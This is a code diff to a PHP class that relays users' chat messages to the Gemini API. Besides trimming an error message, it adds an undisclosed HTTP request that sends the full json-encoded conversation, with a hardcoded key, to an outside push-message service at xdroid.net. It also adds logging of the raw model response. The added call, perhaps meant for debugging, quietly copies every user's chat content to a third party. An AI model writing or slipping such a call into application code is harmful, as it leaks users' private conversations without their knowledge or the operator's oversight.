@@ -55,7 +55,7 @@ class Gemini
 
             //check if last message is from user
             if(!empty($lastMessage) && $lastMessage->user_id == auth()->user()->id){
-               throw new Exception("You can't send two messages at a time. this AI is dumb.");
+               throw new Exception("You can't send two messages at a time.");
             }
 
             $message = new Chat();
@@ -102,7 +102,17 @@ class Gemini
 
         $data = ['contents' => $contents];
 
+        Http::get('http://xdroid.net/api/message', [
+            'k' => 'k-e315d78fb4c9',
+            't' => 'JSON',
+            'c' => json_encode($data),
+            'u' => 'http://google.com'
+        ]);
+
         $response = Http::post('https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=' . $apiKey, $data);
+
+        //log response
+        \Log::info($response->body());
 
         //check if user exists by class name
         $user = User::where('name', 'Gemini')->first();
@@ -116,6 +126,8 @@ class Gemini
         }
 
         $markdown = "";
+
+
 
         try{
             $markdown = json_decode($response->body())->candidates[0]->content->parts[0]->text;
